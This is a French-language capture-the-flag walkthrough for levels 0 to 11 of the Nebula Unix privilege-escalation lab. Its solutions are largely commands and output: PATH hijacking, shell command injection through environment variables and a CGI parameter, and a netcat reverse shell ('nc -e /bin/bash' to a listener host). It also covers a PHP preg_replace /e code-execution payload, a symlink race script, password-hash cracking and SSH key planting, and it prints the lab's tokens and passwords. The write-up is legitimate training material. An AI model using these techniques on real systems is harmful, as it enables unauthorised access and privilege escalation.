# Solution du CTF Nebula (levels 0 à 11)

Le CTF [Nebula](https://www.vulnhub.com/entry/exploit-exercises-nebula-v5,31/) est un vieux challenge qui tourne autour de l'escalade de privilèges sous système Unix. C'est sans doute dans le même état d'esprit que certains challenges de [OverTheWire: Wargames](https://overthewire.org/wargames/).

## Level 0

On an apprend plus sur le CTF en se connectant au port SSH :

```shellsession
$ ssh level00@192.168.56.97
  
      _   __     __          __     
     / | / /__  / /_  __  __/ /___ _
    /  |/ / _ \/ __ \/ / / / / __ `/
   / /|  /  __/ /_/ / /_/ / / /_/ / 
  /_/ |_/\___/_.___/\__,_/_/\__,_/  
                                    
    exploit-exercises.com/nebula


For level descriptions, please see the above URL.

To log in, use the username of "levelXX" and password "levelXX", where
XX is the level number.

Currently there are 20 levels (00 - 19).


level00@192.168.56.97's password: 
Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)

 * Documentation:  https://help.ubuntu.com/
New release '12.04 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

level00@nebula:~$ ls -al
total 5
drwxr-x--- 1 level00 level00   60 2023-01-31 00:14 .
drwxr-xr-x 1 root    root      60 2012-08-27 07:18 ..
-rw-r--r-- 1 level00 level00  220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 level00 level00 3353 2011-05-18 02:54 .bashrc
drwx------ 2 level00 level00   60 2023-01-31 00:14 .cache
-rw-r--r-- 1 level00 level00  675 2011-05-18 02:54 .profile
```

En listant les dossier dans `/home` on trouve une série d'utilisateurs nommés `flagXX` pour lesquels il faudra récupérer des accès :

```shellsession
level00@nebula:~$ ls ..
flag00  flag02  flag04  flag06  flag08  flag10  flag12  flag14  flag16  flag18  level00  level02  level04  level06  level08  level10  level12  level14  level16  level18  nebula
flag01  flag03  flag05  flag07  flag09  flag11  flag13  flag15  flag17  flag19  level01  level03  level05  level07  level09  level11  level13  level15  level17  level19
level00@nebula:~$ ls ../flag00/ -al
total 5
drwxr-x--- 2 flag00 level00   66 2011-11-20 20:21 .
drwxr-xr-x 1 root   root      60 2012-08-27 07:18 ..
-rw-r--r-- 1 flag00 flag00   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag00 flag00  3353 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 flag00 flag00   675 2011-05-18 02:54 .profile
level00@nebula:~$ find / -user flag00 2> /dev/null 
/bin/.../flag00
/home/flag00
/home/flag00/.bash_logout
/home/flag00/.bashrc
/home/flag00/.profile
level00@nebula:~$ file /bin/.../flag00
/bin/.../flag00: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.15, not stripped
level00@nebula:~$ ls -al /bin/.../flag00
-rwsr-x--- 1 flag00 level00 7358 2011-11-20 21:22 /bin/.../flag00
```

Je trouve ainsi un binaire caché pour l'utilisateur `flag00`. Le binaire est setuid et nous indique de lancer une autre commande pour vérifier qu'on a l'accès qu'il faut :

```shellsession
level00@ebula:~$ /bin/.../flag00
Congrats, now run getflag to get your flag!
flag00@nebula:~$ id
uid=999(flag00) gid=1001(level00) groups=999(flag00),1001(level00)
flag00@nebula:~$ getflag
You have successfully executed getflag on a target account
```

On peut jeter un oeil rapide pour voir ce que ce binaire fait :

```nasm
flag00@nebula:~$ gdb -q /bin/getflag
Reading symbols from /bin/getflag...(no debugging symbols found)...done.
(gdb) disass main
Dump of assembler code for function main:
   0x080483f0 <+0>:     push   %ebp
   0x080483f1 <+1>:     mov    %esp,%ebp
   0x080483f3 <+3>:     push   %edi
   0x080483f4 <+4>:     push   %esi
   0x080483f5 <+5>:     and    $0xfffffff0,%esp
   0x080483f8 <+8>:     sub    $0x10,%esp
   0x080483fb <+11>:    call   0x8048390 <geteuid@plt>
   0x08048400 <+16>:    mov    %eax,(%esp)
   0x08048403 <+19>:    call   0x8048380 <getpwuid@plt>
   0x08048408 <+24>:    test   %eax,%eax
   0x0804840a <+26>:    mov    %eax,%esi
   0x0804840c <+28>:    je     0x8048451 <main+97>
   0x0804840e <+30>:    mov    (%esi),%eax
   0x08048410 <+32>:    mov    $0x80486e4,%edi
   0x08048415 <+37>:    mov    $0x5,%ecx
   0x0804841a <+42>:    mov    %eax,%esi
   0x0804841c <+44>:    repz cmpsb %es:(%edi),%ds:(%esi)
   0x0804841e <+46>:    je     0x8048467 <main+119>
   0x08048420 <+48>:    mov    $0x80486e9,%edi
   0x08048425 <+53>:    mov    $0x4,%ecx
   0x0804842a <+58>:    mov    %eax,%esi
   0x0804842c <+60>:    repz cmpsb %es:(%edi),%ds:(%esi)
   0x0804842e <+62>:    je     0x8048443 <main+83>
   0x08048430 <+64>:    movl   $0x80486a4,(%esp)
   0x08048437 <+71>:    call   0x80483b0 <puts@plt>
   0x0804843c <+76>:    lea    -0x8(%ebp),%esp
   0x0804843f <+79>:    pop    %esi
   0x08048440 <+80>:    pop    %edi
   0x08048441 <+81>:    pop    %ebp
   0x08048442 <+82>:    ret    
   0x08048443 <+83>:    movl   $0x8048668,(%esp)
   0x0804844a <+90>:    call   0x80483b0 <puts@plt>
   0x0804844f <+95>:    jmp    0x804843c <main+76>
   0x08048451 <+97>:    movl   $0x8048610,0x4(%esp)
   0x08048459 <+105>:   movl   $0x1,(%esp)
   0x08048460 <+112>:   call   0x80483a0 <err@plt>
   0x08048465 <+117>:   jmp    0x804840e <main+30>
   0x08048467 <+119>:   movl   $0x8048630,(%esp)
   0x0804846e <+126>:   call   0x80483b0 <puts@plt>
   0x08048473 <+131>:   movl   $0x1,(%esp)
   0x0804847a <+138>:   call   0x80483d0 <exit@plt>
End of assembler dump.
(gdb) x/s 0x80486e4
0x80486e4:       "root"
(gdb) x/s 0x80486e9
0x80486e9:       "flag"
```

Visiblement il récupère l'effective UID puis le convertit en nom d'utilisateur via `getpwuid`. Il s'assure ensuite que le nom d'utilisateur commence par `root` ou `flag`.

## Level 1

```shellsession
level01@nebula:/home/flag01$ ls -al
total 13
drwxr-x--- 2 flag01 level01   92 2011-11-20 21:22 .
drwxr-xr-x 1 root   root      80 2012-08-27 07:18 ..
-rw-r--r-- 1 flag01 flag01   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag01 flag01  3353 2011-05-18 02:54 .bashrc
-rwsr-x--- 1 flag01 level01 7322 2011-11-20 21:22 flag01
-rw-r--r-- 1 flag01 flag01   675 2011-05-18 02:54 .profile
level01@nebula:/home/flag01$ strings flag01 
/lib/ld-linux.so.2
y%[3
)&cj
__gmon_start__
libc.so.6
_IO_stdin_used
setresgid
setresuid
system
getegid
geteuid
__libc_start_main
GLIBC_2.0
PTRh
UWVS
[^_]
/usr/bin/env echo and now what?
;*2$"
```

On a un binaire qui semble simple et doit lancer via `system` la commande `/usr/bin/env echo and now what?`

Ca reste du bash et on peut interférer dessus en mettant un exécutable `echo` à nous en priorité dans le PATH.

```shellsession
level01@nebula:/home/flag01$ cd /tmp/
level01@nebula:/tmp$ id
uid=1002(level01) gid=1002(level01) groups=1002(level01)
level01@nebula:/tmp$ cat > echo
#!/bin/bash
dash
^C
level01@nebula:/tmp$ PATH=/tmp:$PATH /home/flag01/flag01
$ id
uid=998(flag01) gid=1002(level01) groups=998(flag01),1002(level01)
$ getflag
You have successfully executed getflag on a target account
```

## Level 2

On a pour ce binaire un `getenv`, un `asprint` et un nom de variable `USER`...

```shellsession
level02@nebula:/home/flag02$ strings flag02 
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
_IO_stdin_used
setresgid
asprintf
getenv
setresuid
system
getegid
geteuid
__libc_start_main
GLIBC_2.0
PTRhP
QVh4
UWVS
[^_]
USER
/bin/echo %s is cool
about to call system("%s")
;*2$"
```

On peut ainsi injecter des commandes dans la chaine passée à `system` :

```shellsession
level02@nebula:/home/flag02$ USER=";dash;#" ./flag02
about to call system("/bin/echo ;dash;# is cool")

$ id
uid=997(flag02) gid=1003(level02) groups=997(flag02),1003(level02)
$ getflag
You have successfully executed getflag on a target account
```

## Level 3

```shellsession
level03@nebula:/home/flag03$ ls -l
total 1
drwxrwxrwx 2 flag03 flag03  3 2012-08-18 05:24 writable.d
-rwxr-xr-x 1 flag03 flag03 98 2011-11-20 21:22 writable.sh
level03@nebula:/home/flag03$ ls -al writable.d/
total 0
drwxrwxrwx 2 flag03 flag03    3 2012-08-18 05:24 .
drwxr-x--- 3 flag03 level03 103 2011-11-20 20:39 ..
level03@nebula:/home/flag03$ cat writable.sh 
#!/bin/sh

for i in /home/flag03/writable.d/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

On a un dossier world-writable et un script bash qui va exécuter tout ce qu'il se trouve à l'intérieur. Le dossier est vide et il n'y a aucun signe visible que le script soit exécuté via une tache planifiée mais on va essayer :

```shellsession
level03@nebula:/home/flag03$ cat > /tmp/test
#!/bin/bash
touch /tmp/winner.txt
^C
level03@nebula:/home/flag03$ chmod 755 /tmp/test
level03@nebula:/home/flag03$ mv /tmp/test /home/flag03/writable.d/
```

Après quelques minutes c'est bien exécuté :

```shellsession
level03@nebula:/home/flag03$ ls -l /tmp/
total 3
-rw-rw-r-- 1 flag03  flag03   0 2023-01-31 01:06 winner.txt
```

On va faire de même mais en copiant une clé publique SSH à l'emplacement du `authorized_keys` :

```shellsession
level03@nebula:/home/flag03$ ssh-keygen 
Generating public/private rsa key pair.
Enter file in which to save the key (/home/level03/.ssh/id_rsa): /tmp/ctf_key
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /tmp/ctf_key.
Your public key has been saved in /tmp/ctf_key.pub.
The key fingerprint is:
45:85:90:5c:6f:37:ca:6f:17:7e:09:ae:8f:ee:69:ef level03@nebula
The key's randomart image is:
+--[ RSA 2048]----+
|       ..+oo.    |
|        o...     |
|          . o o  |
|         . o o . |
|        S   o. . |
|            ..o o|
|             .ooo|
|           .+. ..|
|          +*+E   |
+-----------------+
level03@nebula:/home/flag03$ cat > /tmp/test
#!/bin/bash
mkdir -p /home/flag03/.ssh
cp /tmp/ctf_key.pub /home/flag03/.ssh/authorized_keys
^C
level03@nebula:/home/flag03$ mv /tmp/test /home/flag03/writable.d/
```

Et ça fonctionne :

```shellsession
level03@nebula:/home/flag03$ chmod 600 /tmp/ctf_key
level03@nebula:/home/flag03$ ssh -i /tmp/ctf_key flag03@127.0.0.1
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ECDSA key fingerprint is ea:8d:09:1d:f1:69:e6:1e:55:c7:ec:e9:76:a1:37:f0.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '127.0.0.1' (ECDSA) to the list of known hosts.

flag03@nebula:~$ id
uid=996(flag03) gid=996(flag03) groups=996(flag03)
flag03@nebula:~$ getflag 
You have successfully executed getflag on a target account
```

## Level 4

On a un binaire setuid et un fichier qu'on ne peut pas lire. On retrouve le nom du fichier `token` dans le binaire ainsi qu'un `strstr`. Visiblement le binaire bloque tout nom de fichier qui contiendrait `token` :

```shellsession
level04@nebula:/home/flag04$ ls -l
total 8
-rwsr-x--- 1 flag04 level04 7428 2011-11-20 21:52 flag04
-rw------- 1 flag04 flag04    37 2011-11-20 21:52 token
level04@nebula:/home/flag04$ strings flag04 
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
_IO_stdin_used
exit
__stack_chk_fail
printf
strstr
read
open
__libc_start_main
write
GLIBC_2.4
GLIBC_2.0
PTRh 
QVhT
UWVS
[^_]
%s [file to read]
token
You may not access '%s'
Unable to open %s
Unable to read fd %d
;*2$"
level04@nebula:/home/flag04$ ./flag04 token
You may not access 'token'
level04@nebula:/home/flag04$ ./flag04 ./token
You may not access './token'
```

On peut bypasser ça via un lien symbolique :

```shellsession
level04@nebula:/home/flag04$ ln -s /home/flag04/token /tmp/yolo
level04@nebula:/home/flag04$ ./flag04 /tmp/yolo
06508b5e-8909-4f38-b630-fdb148a848a2
level04@nebula:/home/flag04$ su flag04
Password: 
sh-4.2$ getflag 
You have successfully executed getflag on a target account
sh-4.2$ id
uid=995(flag04) gid=995(flag04) groups=995(flag04)
```

## Level 5

```shellsession
level05@nebula:/home/flag05$ ls -al .backup/
total 2
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .
drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 ..
-rw-rw-r-- 1 flag05 flag05  1826 2011-11-20 20:13 backup-19072011.tgz
```

Cette fois pas de binaire mais un fichier de backup qui contient une clé privée SSH :

```shellsession
level05@nebula:/home/flag05$ cp .backup/backup-19072011.tgz /tmp/
level05@nebula:/home/flag05$ cd /tmp/
level05@nebula:/tmp$ tar zxvf backup-19072011.tgz 
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys
level05@nebula:/tmp$ chmod 600 .ssh/id_rsa
level05@nebula:/tmp$ ssh -i .ssh/id_rsa flag05@127.0.0.1
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ECDSA key fingerprint is ea:8d:09:1d:f1:69:e6:1e:55:c7:ec:e9:76:a1:37:f0.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '127.0.0.1' (ECDSA) to the list of known hosts.
  
flag05@nebula:~$ id
uid=994(flag05) gid=994(flag05) groups=994(flag05)
flag05@nebula:~$ getflag 
You have successfully executed getflag on a target account
```

## Level 6

Pas de binaire, pas de process pour cet utilisateur, pas de permissions sudo... On peut trouver un indice que [Level 06 :: Andrew Griffiths' Exploit Education](https://exploit.education/nebula/level-06/) :

> The **flag06** account credentials came from a legacy unix system.

Il m'a fallut quelques minutes pour tilter que je devais regarder le fichier `passwd` du système :

```shellsession
level06@nebula:/home/flag06$ cat /etc/passwd | grep flag06
flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
```

Ca se casse de façon instantanée avec `JtR` :

```shellsession
$ ./john /tmp/hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (descrypt, traditional crypt(3) [DES 128/128 AVX])
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
0g 0:00:00:00 DONE 1/3 (2023-01-31 08:41) 0g/s 40800p/s 40800c/s 40800C/s flag06V..Flag0659
Proceeding with wordlist:./password.lst
Enabling duplicate candidate password suppressor
hello            (flag06)     
1g 0:00:00:00 DONE 2/3 (2023-01-31 08:41) 7.142g/s 181371p/s 181371c/s 181371C/s 123456..121082
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

## Level 7

Pour une fois on a un fichier dans le `home` de l'utilisateur `level` : un script CGI. Il y a t'il un process pour l'utilisateur `flag` qui correspond à un serveur web ?

```shellsession
level07@nebula:~$ ls -l
total 1
-rw-rw-r-- 1 level07 level07 77 2012-08-18 08:03 index.cgi
level07@nebula:~$ cat index.cgi 
<html><head><title>Ping results</title></head><body><pre></pre></body></html>
level07@nebula:~$ ps aux | grep flag07
flag07    1217  0.0  0.0   2588   884 ?        Ss   00:10   0:00 /usr/sbin/thttpd -C /home/flag07/thttpd.conf
level07   3218  0.0  0.0   4184   792 pts/0    S+   01:43   0:00 grep --color=auto flag07
```

Voici un extrait du fichier de conf du `thttpd` :

```apacheconf
# /etc/thttpd/thttpd.conf: thttpd configuration file

# This file is for thttpd processes created by /etc/init.d/thttpd.
# Commentary is based closely on the thttpd(8) 2.25b manpage, by Jef Poskanzer.

# Specifies an alternate port number to listen on.
port=7007

# Specifies a directory to chdir() to at startup. This is merely a convenience -
# you could just as easily do a cd in the shell script that invokes the program.
dir=/home/flag07
```

Donc le `index.cgi` vu plus tôt sert seulement d'indice. Le vrai script est chez `flag07` :

```perl
level07@nebula:~$ cat /home/flag07/index.cgi 
#!/usr/bin/perl

use CGI qw{param};

print "Content-type: text/html\n\n";

sub ping {
        $host = $_[0];

        print("<html><head><title>Ping results</title></head><body><pre>");

        @output = `ping -c 3 $host 2>&1`;
        foreach $line (@output) { print "$line"; } 

        print("</pre></body></html>");

}

# check if Host set. if not, display normal page, etc

ping(param("Host"));
```

Il y a de toute évidence une injection de commande via le paramètre `Host`. J'ai tenté une première exécution mais elle n'aboutissait pas, peut être à cause des espaces. J'ai préféré créer un script sur le système pour l'appeler depuis le CGI :

```shellsession
level07@nebula:~$ cat > /tmp/revshell
#!/bin/bash
/bin/nc.traditional -e /bin/bash 192.168.56.1 4444
^C
level07@nebula:~$ chmod 755 /tmp/revshell
```

Pour l'exécuter je coupe la commande avec des `&` :

`http://192.168.56.97:7007/index.cgi?Host=%26/tmp/revshell%26`

Et j'obtiens bien mon reverse shell :

```shellsession
$ ncat -l -p 4444 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.56.97.
Ncat: Connection from 192.168.56.97:49509.
id
uid=992(flag07) gid=992(flag07) groups=992(flag07)
getflag
You have successfully executed getflag on a target account
^C
```

## Level 8

On change encore de domaine avec un fichier `capture.pcap` (capture réseau à ouvrir avec *Wireshark*). Ca ressemble à une connexion Telnet même si le port n'est pas le 23.

Voici les données envoyées par le client (représentation ascii).

```shellsession
..%..&..... ..#..'..$.. .38400,38400....#.SodaCan:0....'..DISPLAY.SodaCan:0......xterm.........."..".....b........b....	B.
..............................1.......!.."............"level8
backdoor...00Rm8.ate
```

Le mot de passe `backdoor` n'était pas accepté... J'ai donc regardé les octets présents après et ce ne sont pas des points, ils correspondent au code `7F`. Un coup d'oeil sur [man ascii (7): Jeu de caractères ASCII en octal, décimal, et hexadécimal](https://fr.manpages.org/ascii/7) permet de voir que ça correspond à la touche `Del` du clavier donc les caractères sont effacés. Le mot de passe est  en vérité `backd00Rmate`.

```
level08@nebula:~$ su flag08
Password: 
sh-4.2$ id
uid=991(flag08) gid=991(flag08) groups=991(flag08)
sh-4.2$ getflag 
You have successfully executed getflag on a target account
```

## Level 9

```shellsession
level09@nebula:/home/flag09$ ls -l
total 8
-rwsr-x--- 1 flag09 level09 7240 2011-11-20 21:22 flag09
-rw-r--r-- 1 root   root     491 2011-11-20 21:22 flag09.php
level09@nebula:/home/flag09$ strings flag09
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
_IO_stdin_used
setuid
execve
geteuid
__libc_start_main
GLIBC_2.0
PTRhP
QVhD
D$ #
D$$&
UWVS
[^_]
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin
PS1=wibblywobblytimeywimeystuff$ 
/usr/bin/php
/home/flag09/flag09.php
;*2$"
```

Cette fois le binaire semble blindé pour éviter que l'on joue avec les variables d'environnement.

Le PHP mentionné est le suivant :

```php
<?php

function spam($email)
{
        $email = preg_replace("/\./", " dot ", $email);
        $email = preg_replace("/@/", " AT ", $email);

        return $email;
}

function markup($filename, $use_me)
{
        $contents = file_get_contents($filename);

        $contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);
        $contents = preg_replace("/\[/", "<", $contents);
        $contents = preg_replace("/\]/", ">", $contents);

        return $contents;
}

$output = markup($argv[1], $argv[2]);

print $output;

?>
```

Les plus anciens auront remarqué la présence de l'option `/e` sur `preg_replace`. C'est un indicateur qui a été déprécié depuis mais ce qu'il se passe sur le match pour l'adresse email dans la fonction `markup` c'est que le code va extraire ce qui se trouve entre `[email ` et `]` (second groupe entre parenthèses). En raison du `/e` la valeur du second groupe est injectée dans l'expression `spam(\"\\2\")` située en second argument de `preg_replace` et exécutée.

Depuis PHP a introduit une fonction plus explicite dont le nom contient `callback`.

Mais malheureusement l'injection n'est pas aussi simple car PHP nous échappe les caractères qui devraient nous permettre d'injecter notre code PHP.

Après recherche il faut utiliser une syntaxe *curly* particulière :

```shellsession
level09@nebula:/home/flag09$ cat /tmp/test.php
[email {${system(chr(100).chr(97).chr(115).chr(104))}}]
level09@nebula:/home/flag09$ ./flag09 /tmp/test.php yolo
id
uid=1010(level09) gid=1010(level09) euid=990(flag09) groups=990(flag09),1010(level09)
getflag
You have successfully executed getflag on a target account
^C
```

D'autres références :

[PHP: Strings - Manual](https://www.php.net/manual/en/language.types.string.php#language.types.string.parsing.complex)

[PHP::Preg_replace() RCE | Ikonw's blog]([PHP::Preg_replace() RCE | Ikonw&#39;s blog](https://ik0nw.github.io/2020/09/23/PHP::Preg_replace()-RCE/index.html))

## Level 10

Visiblement sur ce CTF (ou sur cette version), l'auteur a laissé quelques fichiers qui permettent de bypasser l'exercice :

```shellsession
level10@nebula:~$ ls -al
total 11
drwxr-x--- 1 level10 level10   60 2023-01-31 04:47 .
drwxr-xr-x 1 root    root     380 2012-08-27 07:18 ..
-rw-r--r-- 1 level10 level10  220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 level10 level10 3353 2011-05-18 02:54 .bashrc
drwx------ 2 level10 level10   60 2023-01-31 04:47 .cache
-rw------- 1 level10 level10   43 2012-08-19 20:20 .lesshst
-rw-r--r-- 1 level10 level10  675 2011-05-18 02:54 .profile
-rw------- 1 level10 level10 4283 2012-08-19 18:27 .viminfo
-rw-rw-r-- 1 level10 level10  382 2012-08-19 18:27 x
```

Ainsi le dernier fichier contient le mot de passe :

```shellsession
level10@nebula:~$ sort x | uniq

615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
level10@nebula:~$ su flag10
Password: 
sh-4.2$ id
uid=989(flag10) gid=989(flag10) groups=989(flag10)
sh-4.2$ getflag
```

Mais ce n'est pas la solution attendue. Il y a un binaire dont on peut trouver la source ici : [Level 10 :: Andrew Griffiths' Exploit Education](https://exploit.education/nebula/level-10/)

```c
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>

int main(int argc, char **argv)
{
  char *file;
  char *host;

  if(argc < 3) {
      printf("%s file host\n\tsends file to host if you have access to it\n", argv[0]);
      exit(1);
  }

  file = argv[1];
  host = argv[2];

  if(access(argv[1], R_OK) == 0) {
      int fd;
      int ffd;
      int rc;
      struct sockaddr_in sin;
      char buffer[4096];

      printf("Connecting to %s:18211 .. ", host); fflush(stdout);

      fd = socket(AF_INET, SOCK_STREAM, 0);

      memset(&sin, 0, sizeof(struct sockaddr_in));
      sin.sin_family = AF_INET;
      sin.sin_addr.s_addr = inet_addr(host);
      sin.sin_port = htons(18211);

      if(connect(fd, (void *)&sin, sizeof(struct sockaddr_in)) == -1) {
          printf("Unable to connect to host %s\n", host);
          exit(EXIT_FAILURE);
      }

#define HITHERE ".oO Oo.\n"
      if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
          printf("Unable to write banner to host %s\n", host);
          exit(EXIT_FAILURE);
      }
#undef HITHERE

      printf("Connected!\nSending file .. "); fflush(stdout);

      ffd = open(file, O_RDONLY);
      if(ffd == -1) {
          printf("Damn. Unable to open file\n");
          exit(EXIT_FAILURE);
      }

      rc = read(ffd, buffer, sizeof(buffer));
      if(rc == -1) {
          printf("Unable to read from file: %s\n", strerror(errno));
          exit(EXIT_FAILURE);
      }

      write(fd, buffer, rc);

      printf("wrote file!\n");

  } else {
      printf("You don't have access to %s\n", file);
  }
}
```

On peut donc utiliser ce binaire setuid pour envoyer le contenu d'un fichier à destination du port 18211 de l'IP de notre choix. Ca tombe bien car il y a aussi un fichier `token` qu'on ne peut normalement pas lire.

Problème : le code fait un `access` pour vérifier qu'on dispose des permissions en lecture sur le fichier avant de l'envoyer. Solution : le code recréé un nouveau descripteur de fichier plus tard, on est donc dans une situation de race condition.

Il faut que l'on fasse en sorte qu'au moment du `access` le fichier traité soit à nous et qu'au moment de la lecture ce soit un lien symbolique vers `token`.

J'ai d'abord écrit ce script en Python 2 (vieux CTF oblige) :

```python
import os

while True:
        try:
                os.unlink("/tmp/readable")
        except Exception:
                pass

        fd = open("/tmp/readable", "a")
        fd.close()

        try:
                os.unlink("/tmp/readable")
        except Exception:
                pass

        os.symlink("/home/flag10/token", "/tmp/readable")
```

Je le lance en background puis je lance une boucle infinnie pour exécuter le binaire vulnérable. De cette façon il y aura bien un moment où les planètes seront alignées :

```shellsession
$ python /tmp/race.py&
$ while true; do  ./flag10 /tmp/readable 127.0.0.1; done
```

Elles s'alignent même assez régulièrement :)

```shellsession
level10@nebula:~$ nc -l -k 18211 | uniq
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
--- snip ---
```

## Level 11

J'ai eu quelques difficultés sur ce CTF mais une recherche sur le web a confirmé qu'il était buggé.

On peut trouver le code source sur le site *Exploit Education* mentionné plus tôt.

Ce que fait le binaire c'est lire son input sur l'entrée standard. Il s'attend à voir une ligne correspondant à l'entête HTTP `Content-Length`.

La valeur spécifiée par l'entête correspond aux données que l'on peut ensuite envoyer mais un if/else fait que si on spécifie une taille supérieur au buffer de destination la lecture sera bornée.

Si tout se passe bien les données sont passées à une méthode `process` qui procéde à un déchiffrement selon cette méthode :

```c
  key = length & 0xff;

  for(i = 0; i < length; i++) {
      buffer[i] ^= key;
      key -= buffer[i];
  }

```

Le premier caractère est XORé avec la longueur de la chaine. Les autres caractères sont XORés avec l'ancienne clé à laquelle est soustrait le code d'ascii du précédent caractère décodé.

Malgré la simplicité apparente de la fonction j'ai eu un peu de mal à écrire le code de décodage en Python que voici :

```python
from ctypes import c_uint8

def crypt(s):
        result = ""
        key = len(s)
        for i, c in enumerate(s):
                result += chr(ord(c) ^ key)
                key = (c_uint8(key).value - c_uint8(ord(c)).value) & 0xff
        return result


def decrypt(s):
        result = ""
        key = len(s)
        for c in s:
                result += chr(ord(c) ^ key)
                key = (c_uint8(key).value - c_uint8(ord(result[-1])).value) & 0xff
        return result

assert crypt(decrypt("system")) == "system"

cmd = "a"
l = len(cmd)
print "Content-Length: 1" 
print crypt(cmd)
```

La bonne blague dans le code vulnérable se trouve ici :

```c
  length = atoi(line + strlen(CL));
  
  if(length < sizeof(buf)) {
      if(fread(buf, length, 1, stdin) != length) {
          err(1, "fread length");
      }
      process(buf, length);
  } else {
```

`length` est la taille du buffer telle que spécifiée par l'entête `Content-Length`. Le code s'assure donc qu'on lise `length` octets seulement si on a assez de place. Jusque là tout va bien.

Seulement si le résultat du `fread` est différent de `length` nous n'atteignons jamais l'appel à `process`. Et là `fread` indique de lire 1 bloc de `length` octets. Le problème c'est que `fread` retourne le nombre de blocs lus... par conséquence il retourne toujours 1 !

On peut utiliser mon code pour faire exécuter une commande dont le nom est d'un caractère mais il faut que la chance mette un octet nul en mémoire après :

```shellsession
level11@nebula:/home/flag11$ cat > /tmp/a
#!/bin/bash
id 
dash
^C
level11@nebula:/home/flag11$ chmod 755 /tmp/a
level11@nebula:/home/flag11$ python /tmp/gen.py | ./flag11
sh: $'a\360\034': command not found
level11@nebula:/home/flag11$ python /tmp/gen.py | ./flag11
sh: $'a\300\225': command not found
level11@nebula:/home/flag11$ python /tmp/gen.py | ./flag11
uid=1012(level11) gid=1012(level11) groups=1012(level11)
```

Seconde déconvenue : l'exécutable est setuid mais il droppe les privilèges avant l'appel à système, ce qui n'était pas indiqué dans le code source...

Une autre solution vue dans les articles suivants :

[nebula-level11.md · GitHub](https://gist.github.com/graugans/88e6f54c862faec8b3d4bf5789ef0dd9)

[Nebula Walkthrough | Ayrx's Blog](https://www.ayrx.me/nebula-walkthrough/)

[nebula-writeup/level11.md at main · vi11ain/nebula-writeup · GitHub](https://github.com/vi11ain/nebula-writeup/blob/main/level11.md)

Elle consiste à entrer dans le bloc `else` en annoncant un buffer plus grand ou égal à 1024 octets et à essayer de prédire le nom de fichier généré dans la fonction `getrand` :

```c
int getrand(char **path)
{
  char *tmp;
  int pid;
  int fd;

  srandom(time(NULL));

  tmp = getenv("TEMP");
  pid = getpid();
  
  asprintf(path, "%s/%d.%c%c%c%c%c%c", tmp, pid,
      'A' + (random() % 26), '0' + (random() % 10),
      'a' + (random() % 26), 'A' + (random() % 26),
      '0' + (random() % 10), 'a' + (random() % 26));

  fd = open(*path, O_CREAT|O_RDWR, 0600);
  unlink(*path);
  return fd;
}
```

Comme la source de pseudo aléa est basée sur `time` qui a la granularité d'une seconde et que le reste du nom de fichier utilise le PID qui va souvent en s'incrémentant on peut s'arranger pour créer un lien symbolique qui permettra d'écrire un fichier `authorized_keys` avec le contenu de notre choix.

C'est pour la théorie car de mon côté le binaire plantait à partir du moment où je lui donnait 1024 octets ou plus :

```shellsession
level11@nebula:/home/flag11$ python /tmp/gen.py | ./flag11
blue = 1024, length = 1024, pink = 1024
flag11: mmap: Bad file descriptor
```

*Publié le 31 janvier 2023*
